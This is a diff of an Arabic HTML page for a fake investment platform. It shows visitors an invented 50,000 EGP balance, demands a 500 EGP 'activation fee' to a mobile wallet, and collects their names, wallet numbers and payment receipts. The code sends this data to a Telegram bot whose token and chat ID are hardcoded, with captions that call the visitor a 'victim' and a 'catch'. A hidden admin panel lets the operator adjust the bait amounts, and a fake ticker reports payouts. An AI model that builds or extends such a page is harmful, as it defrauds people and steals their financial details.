@@ -3,149 +3,171 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة التقوى - بوابة الدخول</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <title>Al-Taqwa Global | منصة التقوى العالمية</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;500;700;900&display=swap" rel="stylesheet">
     <style>
-        :root { --main-grad: linear-gradient(135deg, #020024, #090979, #00d4ff); --gold: #ffcc00; --success: #00ff88; }
-        body { margin: 0; font-family: 'Cairo', sans-serif; background: var(--main-grad); color: white; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 15px; overflow-x: hidden; }
-        .login-card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 40px 20px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.2); width: 100%; max-width: 380px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        .login-card input { width: 80%; padding: 15px; border-radius: 12px; border: 1px solid var(--gold); background: rgba(0,0,0,0.5); color: white; font-size: 18px; text-align: center; outline: none; margin-bottom: 20px; }
-        .login-card button { background: var(--gold); border: none; padding: 12px 40px; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; width: 85%; transition: 0.3s; }
-        #admin-trigger { position: fixed; bottom: 0; right: 0; width: 30px; height: 30px; background: transparent; cursor: pointer; z-index: 9999; }
-        #admin-panel { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 10000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: right; }
-        .admin-content { background: #111; border: 2px solid var(--gold); padding: 25px; border-radius: 20px; width: 300px; }
-        .admin-content input { width: 100%; padding: 10px; margin-top: 5px; background: #222; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box; }
-        #main-site { display: none; width: 100%; max-width: 420px; }
-        .site-card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(15px); padding: 25px; border-radius: 25px; border: 1px solid rgba(255,255,255,0.2); text-align: center; }
-        .balance-box { background: rgba(0,0,0,0.4); padding: 20px; border-radius: 15px; border-right: 5px solid var(--gold); margin-bottom: 20px; }
-        input[type="text"], input[type="tel"], input[type="file"] { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: none; background: white; color: #333; box-sizing: border-box; }
-        .submit-btn { background: var(--success); color: #000; border: none; width: 100%; padding: 15px; font-size: 18px; font-weight: 900; border-radius: 10px; cursor: pointer; }
-        #loader { position: fixed; inset: 0; background: rgba(0,0,0,0.9); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 11000; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        :root { --primary: #0f172a; --accent: #fbbf24; --success: #22c55e; --glass: rgba(255, 255, 255, 0.05); }
+        * { box-sizing: border-box; transition: all 0.3s ease; }
+        body { margin: 0; font-family: 'Cairo', sans-serif; background: radial-gradient(circle at top, #1e293b, #0f172a); color: white; min-height: 100vh; overflow-x: hidden; }
+
+        /* شريط السحوبات */
+        .live-ticker { background: rgba(0,0,0,0.5); padding: 8px 0; border-bottom: 1px solid var(--accent); overflow: hidden; white-space: nowrap; position: fixed; top: 0; width: 100%; z-index: 1000; font-size: 13px; }
+        .ticker-wrap { display: inline-block; animation: ticker 30s linear infinite; }
+        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
+
+        .main-wrapper { display: flex; align-items: center; justify-content: center; padding: 60px 20px; }
+        .glass-card { background: var(--glass); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); border-radius: 35px; width: 100%; max-width: 450px; padding: 30px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); position: relative; }
+        
+        .balance-section { background: rgba(0,0,0,0.3); border-radius: 20px; padding: 25px; margin: 20px 0; border-right: 4px solid var(--accent); }
+        .balance-section h1 { font-size: 42px; margin: 10px 0; font-weight: 900; }
+
+        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1); background: rgba(255,255,255,0.05); color: white; outline: none; }
+        .action-btn { background: var(--accent); color: #000; border: none; width: 100%; padding: 18px; font-size: 19px; font-weight: 900; border-radius: 15px; cursor: pointer; margin-top: 15px; }
+
+        /* اللوحة المخفية */
+        #admin-panel { position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 20000; display: none; padding: 20px; overflow-y: auto; }
+        .admin-box { background: #111; border: 2px solid var(--accent); padding: 25px; border-radius: 25px; max-width: 400px; margin: 50px auto; }
+        .admin-box label { display: block; font-size: 12px; color: var(--accent); margin-top: 10px; text-align: right; }
+
+        #loader { position: fixed; inset: 0; background: #0f172a; z-index: 30000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
     </style>
 </head>
 <body>
 
-<div id="admin-trigger" onclick="adminClick()"></div>
+<div class="live-ticker">
+    <div class="ticker-wrap">
+        تنبيه: تم معالجة سحب بقيمة 18,400 ج.م للمستخدم م*** ص*** بنجاح • منصة التقوى العالمية مؤمنة بشهادة SSL • سحب فوري عبر المحافظ الإلكترونية
+    </div>
+</div>
 
-<div class="login-card" id="login-page">
-    <h1>🏮 شركة التقوى للاستثمار 🌙</h1>
-    <p style="font-size: 14px; color: #ccc;">برجاء إدخال كود الدخول للمنصة</p>
-    <input type="password" id="entryPass" placeholder="كود الوصول">
-    <button onclick="accessSite()">دخول</button>
+<div id="loader">
+    <div style="width:60px; height:60px; border:5px solid #1e293b; border-top-color:var(--accent); border-radius:50%; animation:spin 1s linear infinite;"></div>
+    <p style="margin-top:20px;">Secure Connection...</p>
+</div>
+
+<div class="main-wrapper">
+    <div class="glass-card" id="loginArea">
+        <h2 style="color:var(--accent);">🏮 بوابة المستثمرين</h2>
+        <input type="password" id="entryCode" placeholder="كود الوصول الشخصي">
+        <button class="action-btn" onclick="checkAuth()">دخول آمن</button>
+    </div>
+
+    <div class="glass-card" id="siteArea" style="display:none;">
+        <div class="balance-section">
+            <small style="color:#94a3b8">الرصيد القابل للسحب</small>
+            <h1 id="dynBalance">50,000.00</h1>
+            <small style="color:var(--accent)">EGP (جنيه مصري)</small>
+        </div>
+        
+        <input type="text" id="targetName" placeholder="الاسم الرباعي">
+        <input type="tel" id="targetWallet" placeholder="رقم المحفظة">
+        
+        <div style="background:rgba(255,255,255,0.05); padding:15px; border-radius:12px; margin:15px 0;">
+            <p style="margin:0; font-size:12px;">رسوم التفعيل المطلوبة: <b id="displayFees" style="color:var(--accent)">500</b> ج.م</p>
+            <p style="margin:5px 0 0 0; font-size:12px;">حول الرسوم للرقم التالي:</p>
+            <strong id="displayWallet" style="color:var(--accent); font-size:20px; letter-spacing:1px;">01226811784</strong>
+        </div>
+
+        <input type="file" id="targetFile">
+        <button class="action-btn" onclick="finalize()">تأكيد عملية السحب</button>
+    </div>
 </div>
 
 <div id="admin-panel">
-    <div class="admin-content">
-        <h3 style="color:var(--gold); margin:0; text-align:center;">لوحة إدارة المنصة</h3>
-        <label>كود الدخول:</label>
-        <input type="text" id="setPass" value="123456">
-        <label>المدة (بالدقائق):</label>
-        <input type="number" id="setTime" value="5">
-        <label>الأرباح:</label>
-        <input type="number" id="setProfit" value="50000">
-        <label>الرسوم:</label>
-        <input type="number" id="setFees" value="500">
-        <button onclick="saveAdminSettings()" style="width:100%; margin-top:10px; padding:10px; background:var(--success); border:none; border-radius:5px; font-weight:bold; cursor:pointer;">حفظ وإغلاق</button>
+    <div class="admin-box">
+        <h3 style="color:white; text-align:center;">لوحة التحكم السرية ⚙️</h3>
+        
+        <label>كود الدخول للموقع:</label>
+        <input type="text" id="admPass">
+        
+        <label>مبلغ الربح الظاهر:</label>
+        <input type="number" id="admProfit">
+        
+        <label>قيمة رسوم التفعيل (ج.م):</label>
+        <input type="number" id="admFees">
+        
+        <label>رقم فودافون كاش (للتحويل):</label>
+        <input type="text" id="admWallet">
+        
+        <button class="action-btn" onclick="saveAdmin()">حفظ كل التعديلات ✅</button>
+        <button onclick="document.getElementById('admin-panel').style.display='none'" style="background:none; border:none; color:grey; width:100%; margin-top:10px; cursor:pointer;">إغلاق</button>
     </div>
 </div>
 
-<div id="main-site">
-    <div class="site-card">
-        <div class="timer-badge" style="background: rgba(255,0,0,0.3); color: #ff4d4d; padding: 5px 15px; border-radius: 20px; font-weight: bold; font-size: 14px; margin-bottom: 15px; display: inline-block; border: 1px solid #ff4d4d;">⏱️ الجلسة تنتهي خلال: <span id="displayTime">05:00</span></div>
-        <h2 style="color:var(--gold); margin:0;">لوحة الأرباح</h2>
-        <div class="balance-box">
-            <span style="font-size:12px; color:#aaa;">رصيدك الحالي</span>
-            <div style="font-size: 32px; font-weight: 900;"><span id="showProfit">50,000</span> <small style="font-size:14px;">EGP</small></div>
-        </div>
-        <input type="text" id="uName" placeholder="الاسم بالكامل">
-        <input type="tel" id="uWallet" placeholder="رقم المحفظة (فودافون كاش..)">
-        <p style="font-size:12px;">رسوم المعالجة المطلوبة (<span id="showFees" style="color:var(--gold); font-weight:bold;">500</span> ج.م) للرقم:</p>
-        <div style="background:#000; color:var(--gold); padding:10px; border-radius:10px; font-weight:bold; margin-bottom:15px;">01226811784</div>
-        <label style="display:block; text-align:right; font-size:12px; color:var(--gold);">ارفق صورة إيصال التحويل:</label>
-        <input type="file" id="uFile" accept="image/*">
-        <button class="submit-btn" onclick="sendToTelegram()">تأكيد السحب الآن</button>
-    </div>
-</div>
-
-<div id="loader"><div style="width:50px; height:50px; border:4px solid #333; border-top:4px solid var(--success); border-radius:50%; animation:spin 1s linear infinite;"></div><p>جاري المعالجة...</p></div>
+<div style="position:fixed; bottom:0; right:0; width:60px; height:60px; z-index:25000; cursor:pointer;" onclick="adminTap()"></div>
 
 <script>
-    const TOKEN = '8398403697:AAEf0JjyVG-yE-DLS1FZKDX1_UKg8lEm02E';
-    const ID = '8232581666';
+    const BOT_TOKEN = '8398403697:AAEf0JjyVG-yE-DLS1FZKDX1_UKg8lEm02E';
+    const CHAT_ID = '8232581666';
 
-    let config = JSON.parse(localStorage.getItem('adminConfig')) || { pass: '123456', time: 5, profit: 50000, fees: 500 };
+    // الإعدادات الافتراضية
+    let settings = JSON.parse(localStorage.getItem('taqwa_pro_cfg')) || { 
+        pass: '123456', 
+        profit: 50000, 
+        fees: 500, 
+        wallet: '01226811784' 
+    };
 
-    function applyConfig() {
-        document.getElementById('showProfit').innerText = Number(config.profit).toLocaleString();
-        document.getElementById('showFees').innerText = config.fees;
-        document.getElementById('setPass').value = config.pass;
-        document.getElementById('setTime').value = config.time;
-        document.getElementById('setProfit').value = config.profit;
-        document.getElementById('setFees').value = config.fees;
-    }
-    applyConfig();
+    let clicks = 0;
 
-    let count = 0;
-    function adminClick() { count++; if(count >= 3) { document.getElementById('admin-panel').style.display='flex'; count=0; } }
+    window.onload = () => {
+        setTimeout(() => { document.getElementById('loader').style.display='none'; }, 1500);
+        // تحديث الواجهة بالبيانات المخزنة
+        document.getElementById('dynBalance').innerText = Number(settings.profit).toLocaleString('en-US');
+        document.getElementById('displayFees').innerText = settings.fees;
+        document.getElementById('displayWallet').innerText = settings.wallet;
+        
+        // تعبئة خانات الأدمن بالقيم الحالية
+        document.getElementById('admPass').value = settings.pass;
+        document.getElementById('admProfit').value = settings.profit;
+        document.getElementById('admFees').value = settings.fees;
+        document.getElementById('admWallet').value = settings.wallet;
+    };
 
-    function saveAdminSettings() {
-        config = {
-            pass: document.getElementById('setPass').value,
-            time: document.getElementById('setTime').value,
-            profit: document.getElementById('setProfit').value,
-            fees: document.getElementById('setFees').value
+    function adminTap() { clicks++; if(clicks >= 4) { document.getElementById('admin-panel').style.display='block'; clicks=0; } }
+    
+    function saveAdmin() {
+        settings = {
+            pass: document.getElementById('admPass').value,
+            profit: document.getElementById('admProfit').value,
+            fees: document.getElementById('admFees').value,
+            wallet: document.getElementById('admWallet').value
         };
-        localStorage.setItem('adminConfig', JSON.stringify(config));
-        applyConfig();
-        document.getElementById('admin-panel').style.display='none';
+        localStorage.setItem('taqwa_pro_cfg', JSON.stringify(settings));
+        alert("تم تحديث البيانات بنجاح!");
+        location.reload();
     }
 
-    function accessSite() {
-        const pass = document.getElementById('entryPass').value;
-        if(pass === config.pass) {
-            document.getElementById('login-page').style.display = 'none';
-            document.getElementById('main-site').style.display = 'block';
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=🔔 دخول جديد للمنصة بالكود: ${pass}`);
-            startCountdown(config.time * 60);
-        } else {
-            alert("كود خاطئ!");
-        }
+    function checkAuth() {
+        if(document.getElementById('entryCode').value === settings.pass) {
+            document.getElementById('loginArea').style.display = 'none';
+            document.getElementById('siteArea').style.display = 'block';
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔔 مستثمر جديد دخل بالكود: ${settings.pass}`);
+        } else { alert("الكود غير صحيح!"); }
     }
 
-    function startCountdown(sec) {
-        let t = sec;
-        const display = document.getElementById('displayTime');
-        const timer = setInterval(() => {
-            let m = Math.floor(t / 60);
-            let s = t % 60;
-            display.innerText = (m < 10 ? '0' + m : m) + ":" + (s < 10 ? '0' + s : s);
-            if (--t < 0) { clearInterval(timer); alert("انتهى الوقت!"); location.reload(); }
-        }, 1000);
-    }
+    async function finalize() {
+        const n = document.getElementById('targetName').value;
+        const w = document.getElementById('targetWallet').value;
+        const f = document.getElementById('targetFile').files[0];
 
-    async function sendToTelegram() {
-        const name = document.getElementById('uName').value;
-        const wallet = document.getElementById('uWallet').value;
-        const file = document.getElementById('uFile').files[0];
-
-        if(!name || !wallet || !file) { alert("أكمل البيانات وارفق الإيصال!"); return; }
+        if(!n || !w || !f) { alert("أكمل البيانات وارفق الإيصال"); return; }
 
         document.getElementById('loader').style.display='flex';
         const fd = new FormData();
-        fd.append('chat_id', ID);
-        fd.append('photo', file);
-        fd.append('caption', `🌟 طلب سحب جديد 🌟\n👤 الاسم: ${name}\n📱 رقم المحفظة: ${wallet}\n💰 الربح المعروض: ${config.profit}\n💸 الرسوم المدفوعة: ${config.fees}`);
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', f);
+        fd.append('caption', `🔥 صيد جديد 🔥\n👤 الاسم: ${n}\n📱 محفظة الضحية: ${w}\n💰 الربح المعروض: ${settings.profit}\n💸 الرسوم المطلوبة: ${settings.fees}`);
 
         try {
-            const resp = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            if(resp.ok) {
-                alert("تم إرسال طلبك بنجاح، جاري المراجعة.");
-                location.reload();
-            } else { alert("خطأ في الإرسال، حاول ثانية."); }
-        } catch(e) { alert("خطأ في الاتصال بالسيرفر."); }
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            alert("تم إرسال طلبك. سيتم مراجعة التحويل خلال دقائق.");
+            location.reload();
+        } catch(e) { alert("خطأ في الاتصال."); }
         document.getElementById('loader').style.display='none';
     }
 </script>
+
+<style> @keyframes spin { to { transform: rotate(360deg); } } @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } } </style>
 </body>
 </html>
